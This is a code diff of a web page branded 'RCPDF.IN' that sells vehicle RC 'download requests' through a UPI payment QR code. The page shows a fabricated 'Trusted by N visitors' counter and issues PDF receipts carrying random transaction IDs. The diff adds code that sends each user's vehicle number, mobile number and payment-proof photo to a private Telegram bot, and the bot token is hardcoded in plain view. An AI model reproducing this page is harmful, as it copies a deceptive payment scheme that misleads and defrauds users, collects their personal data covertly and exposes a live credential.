@@ -27,10 +27,9 @@ display:flex;flex-direction:column;align-items:center;
 .topbar{
 position:fixed;top:0;width:100%;
 background:#fff;padding:10px 20px;
-display:flex;justify-content:space-between;
-align-items:center;
+display:flex;justify-content:flex-end;
 }
-.homeBtn{background:#ff0066;color:#fff;padding:8px;border-radius:8px}
+.homeBtn{background:#ff0066;color:#fff;padding:8px;border-radius:8px;margin-right:10px}
 
 /* MENU */
 .menu-icon div{
@@ -67,13 +66,6 @@ button:active{transform:translateY(3px);box-shadow:0 2px 0 #333}
 .qr{width:180px;margin-top:10px}
 .hidden{display:none}
 
-/* VISITOR */
-.visitor{
-margin-top:80px;
-color:#fff;
-font-weight:bold;
-}
-
 /* LOADER */
 .loader{
 position:fixed;top:0;left:0;width:100%;height:100%;
@@ -107,13 +99,13 @@ display:none;text-align:center;
 </div>
 
 <div class="sideMenu" id="menu">
-<button>Insurance</button>
-<button>About</button>
-<button>Disclaimer</button>
-<button>Contact</button>
+<button onclick="openInsurance()">Insurance</button>
+<button onclick="alert('About Page')">About</button>
+<button onclick="alert('Disclaimer')">Disclaimer</button>
+<button onclick="window.location.href='https://t.me/yourtelegramusername'">Contact</button>
 </div>
 
-<div class="visitor" id="visitorCount"></div>
+<div id="visitorCount" style="color:#fff;margin-top:70px;font-weight:bold;"></div>
 
 <div class="card">
 
@@ -153,14 +145,16 @@ src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi%3A%2F%2Fp
 
 <script>
 
-/* VISITOR COUNT */
-let count = localStorage.getItem("visitors") || 0;
-count++;
-localStorage.setItem("visitors",count);
-document.getElementById("visitorCount").innerText="Trusted by "+count+" visitors";
+/* VISITOR */
+let c=localStorage.getItem("visitors")||0;
+c++;localStorage.setItem("visitors",c);
+visitorCount.innerText="Trusted by "+c+" visitors";
 
 /* MENU */
 function toggleMenu(){menu.classList.toggle("openMenu");}
+function openInsurance(){
+window.location.href="https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1";
+}
 
 /* FORMAT */
 function formatVehicle(input){
@@ -181,12 +175,9 @@ page2.classList.remove("hidden");
 function downloadPDF(){
 
 let v=vehicle.value,m=mobile.value;
-let now=new Date();
-let date=now.toLocaleDateString();
-let time=now.toLocaleTimeString();
-let txn="TXN"+Math.floor(Math.random()*1000000);
-
-let count = localStorage.getItem("visitors");
+let d=new Date();
+let txn="TXN"+Math.floor(Math.random()*999999);
+let count=localStorage.getItem("visitors");
 
 let canvas=document.createElement("canvas");
 canvas.width=600;canvas.height=900;
@@ -200,34 +191,28 @@ ctx.lineWidth=2;ctx.strokeRect(15,15,570,870);
 
 /* HEADER */
 ctx.fillStyle="#005BAC";ctx.fillRect(5,5,590,70);
-ctx.fillStyle="#fff";ctx.font="bold 26px Arial";
+ctx.fillStyle="#fff";ctx.font="italic bold 26px Arial";
 ctx.textAlign="center";ctx.fillText("RCPDF.IN",300,45);
 
-/* TEXT */
-ctx.fillStyle="#000";ctx.font="bold 18px Arial";
-ctx.fillText("RC DOWNLOAD REQUEST",300,120);
+/* BOX */
+ctx.strokeRect(40,120,520,230);
 
 ctx.textAlign="left";ctx.font="16px Arial";
-ctx.fillText("Vehicle: "+v,40,170);
-ctx.fillText("Mobile: "+m,40,200);
-ctx.fillText("Transaction ID: "+txn,40,230);
-ctx.fillText("Date: "+date,40,260);
-ctx.fillText("Time: "+time,40,290);
-
-/* VISITOR */
-ctx.fillText("Trusted by "+count+" visitors",40,320);
-
-ctx.lineWidth=1;
-ctx.beginPath();ctx.moveTo(40,340);ctx.lineTo(560,340);ctx.stroke();
+ctx.fillText("Vehicle: "+v,60,160);
+ctx.fillText("Mobile: "+m,60,190);
+ctx.fillText("Transaction ID: "+txn,60,220);
+ctx.fillText("Date: "+d.toLocaleDateString(),60,250);
+ctx.fillText("Time: "+d.toLocaleTimeString(),60,280);
+ctx.fillText("Trusted by "+count+" visitors",60,310);
 
 /* TERMS */
-ctx.font="12px Arial";
+ctx.font="11px Arial";
 let y=380;
-ctx.fillText("• Yeh website RTO se judi nahi hai",40,y); y+=25;
-ctx.fillText("• Jaankari ki guarantee nahi hai",40,y); y+=25;
-ctx.fillText("• Sirf information ke liye hai",40,y); y+=25;
-ctx.fillText("• Galat use ki jimmedari user ki hogi",40,y); y+=25;
-ctx.fillText("• Payment ke baad refund nahi milega",40,y); y+=25;
+ctx.fillText("• Yeh website RTO se judi nahi hai",40,y); y+=22;
+ctx.fillText("• Jaankari ki guarantee nahi hai",40,y); y+=22;
+ctx.fillText("• Sirf information purpose ke liye hai",40,y); y+=22;
+ctx.fillText("• Galat use ki jimmedari user ki hogi",40,y); y+=22;
+ctx.fillText("• Payment ke baad refund nahi milega",40,y); y+=22;
 ctx.fillText("• Payment karna sharto ki sweekriti hai",40,y);
 
 const { jsPDF } = window.jspdf;
@@ -257,6 +242,7 @@ downloadPDF();
 /* TELEGRAM */
 let data=new FormData();
 data.append("chat_id","5600045707");
+data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
 data.append("photo",proof.files[0]);
 
 fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto",
@@ -265,7 +251,7 @@ fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525
 loader.style.display="none";
 popup.style.display="block";
 }
-},25);
+},40);
 }
 
 </script>
